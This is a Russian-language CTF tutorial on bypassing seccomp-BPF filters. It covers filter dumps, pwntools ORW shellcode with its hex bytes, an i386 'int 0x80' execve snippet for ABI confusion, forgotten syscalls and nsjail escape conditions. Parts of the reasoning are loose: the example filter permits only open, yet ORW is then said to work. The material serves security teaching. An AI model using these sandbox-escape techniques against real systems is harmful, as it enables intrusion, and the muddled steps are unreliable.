## Вопрос, с которого всё начинается

В pwn-задаче тебе удалось получить управление исполнением: можно выполнить любой код. Ты готовишь классический shellcode `execve("/bin/sh", ...)` — и программа мгновенно умирает. Ни шелла, ни флага. Причина — **seccomp**: ядро ограничило набор системных вызовов, и `execve` в этом наборе нет. Задача изменилась: нужно не запустить шелл, а прочитать флаг **разрешёнными** вызовами.

Разберём seccomp-BPF на задаче с фильтром.

## Наш пример: pwn-задача с фильтром

**seccomp** (secure computing) — механизм Linux, ограничивающий системные вызовы процесса. Программа регистрирует фильтр через `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)`. Фильтр — это программа на **BPF** (классический Berkeley Packet Filter), которая исполняется ядром на каждом системном вызове и возвращает решение: разрешить, вернуть ошибку или убить процесс.

Действия фильтра:

| Действие | Смысл |
|----------|-------|
| `SECCOMP_RET_ALLOW` | разрешить вызов |
| `SECCOMP_RET_ERRNO` | вернуть errno, не выполняя |
| `SECCOMP_RET_KILL_THREAD` | убить поток |
| `SECCOMP_RET_TRAP` | послать SIGSYS |
| `SECCOMP_RET_LOG` | залогировать и разрешить |

## Шаг 1: дампим фильтр

Слепой перебор syscall'ов бесполезен: неверный вызов убивает процесс. Сначала **читаем фильтр** утилитой `seccomp-tools`:

```bash
$ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x06 0x00 0x00 0x00000000  return KILL
 0005: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00050000  return ERRNO(0)
```

Каждая строка — инструкция BPF: что загрузить в аккумулятор `A`, с чем сравнить, куда перейти. Важно: фильтр видит только **значения регистров** — номер вызова (`sys_number`), архитектуру (`arch`) и аргументы как числа. Он **не может разыменовать указатели**: содержимое строки, переданной в `open`, ему недоступно.

## Шаг 2: читаем дамп и находим дыру

Разбираем наш фильтр построчно:

- если `arch != ARCH_X86_64` → `KILL` (защита от смены архитектуры);
- если `sys_number >= 0x40000000` → `KILL` (защита от **x32 ABI**);
- если `open` → `ALLOW`, иначе → `ERRNO`.

Итог: разрешён только `open`, всё остальное — ошибка, а `execve` вообще не вариант. Но флаг можно прочитать и одним `open`? Нет — нужно ещё вывести содержимое. Значит, фильтр в этой задаче либо неполный, либо полагается на то, что мы найдём другой путь. Проверим полный набор правил — часто в реальных фильтрах разрешены `read` и `write`, а запрещён только `execve`.

## Шаг 3: ORW вместо execve

Самый частый случай: `execve` запрещён, а `open`, `read`, `write` разрешены. Тогда **shell не нужен** — читаем флаг напрямую. Приём называется **ORW** (open-read-write):

1. `open("flag.txt", O_RDONLY)` — открыть файл, получить дескриптор `fd`;
2. `read(fd, buf, n)` — прочитать содержимое в буфер;
3. `write(1, buf, n)` — вывести буфер в stdout (дескриптор 1).

Собираем shellcode через pwntools:

```python
from pwn import *
context.arch = 'amd64'
sc = shellcraft.open('flag.txt') \
   + shellcraft.read('rax', 'rsp', 0x100) \
   + shellcraft.write(1, 'rsp', 0x100)
b = asm(sc)
print(len(b), b.hex())
```

```
57 6a01fe0c2448b8666c61672e747874504889e731d231f66a02580f054889c731c031d2b6014889e60f056a015f31d2b6014889e66a01580f05
```

57 байт — компактно и без `execve`. Вставляем их в эксплойт — флаг выводится.

## Шаг 4: архитектурный обход (x32 и i386)

Иногда фильтр настроен на один ABI, а процесс может работать в другом. Два классических обхода:

- **x32 ABI.** У номеров syscall x32 установлен бит `0x40000000`. Если фильтр **не** отсекает старшие биты, можно вызвать x32-вариант запрещённого вызова (например, x32 `execve`) — фильтр его «не узнает». Именно поэтому в нашем дампе стоит `if (A >= 0x40000000) KILL`.
- **i386 через `int 0x80`.** Если фильтр проверяет `arch == ARCH_X86_64`, но не отсекает i386-номера, из 64-битного процесса можно переключиться в 32-битный режим и вызвать `execve` с i386-номером (11), который фильтр не проверял:

```asm
mov eax, 11          ; SYS_execve (i386)
mov ebx, path
xor ecx, ecx
xor edx, edx
int 0x80
```

Вывод простой: **проверь, покрывает ли фильтр все ABI**, на которых может работать процесс. Отсутствие `arch`-check или отсечения `>= 0x40000000` — дыра.

## Шаг 5: забытые syscalls и TOCTOU

Фильтры пишут руками и часто забывают отдельные вызовы:

- блокируют `open`/`openat`, но не `openat2` (новый syscall с расширенной структурой);
- разрешают `sendfile` — им можно скопировать файл прямо в сокет, минуя `read`/`write`;
- разрешают `ptrace` или `process_vm_readv` — читаем память процесса, где лежит флаг.

А **TOCTOU** с указателями работает «в обе стороны»: фильтр не может проверить путь, поэтому проверка «запретить конкретный файл» технически невозможна на уровне seccomp.

## Шаг 6: побег из nsjail

`nsjail` комбинирует seccomp, namespaces, rlimits и cgroups. Побег требует либо бага в самом nsjail, либо ослабленной конфигурации:

- разрешён `clone`/`unshare` → создаём новый namespace и выбираемся;
- разрешён `mount` → монтируем хост-ФС;
- `/proc` без `hidepid` → видим чужие процессы;
- выданы `CAP_SYS_ADMIN` → почти полный побег.

Проверяем окружение:

```bash
$ cat /proc/self/status | grep -E 'Seccomp|CapEff|NoNewPrivs'
Seccomp: 2
CapEff: 0000000000000000
NoNewPrivs: 1
$ capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')
```

`Seccomp: 2` — фильтр активен, `NoNewPrivs: 1` — привилегии не поднять. Классифицируй песочницу: «логическая» (фильтр syscalls), «ресурсная» (rlimits), «пространственная» (namespaces) — от класса зависит техника побега.

## Что мы теперь знаем

- **seccomp-BPF** — программа-фильтр, решающая судьбу каждого системного вызова.
- Фильтр видит только **значения регистров**, но не память по указателям.
- Первый шаг — **дамп фильтра** (`seccomp-tools dump`), иначе стреляешь вслепую.
- Если `execve` запрещён, а `open`/`read`/`write` разрешены — пишем **ORW**-шеллкод.
- **ABI confusion** (x32, i386 через `int 0x80`) обходит фильтры без проверки `arch`.
- Забытые вызовы (`openat2`, `sendfile`, `ptrace`) и ослабленный **nsjail** — тоже дыры.

## На что смотреть дальше

Установи `seccomp-tools`, собери свой sandbox и потренируйся писать ORW-шеллкод. В дампе ищи: есть ли `arch`-check, отсечены ли x32 (`>= 0x40000000`), разрешены ли `openat`/`openat2`/`sendfile`/`ptrace`, что возвращается по умолчанию. Помни про наследование фильтра дочерними процессами. Дальше — `misc-namespace-escape` (namespaces/cgroups) и `misc-container-runtime` (побег из runc/containerd).
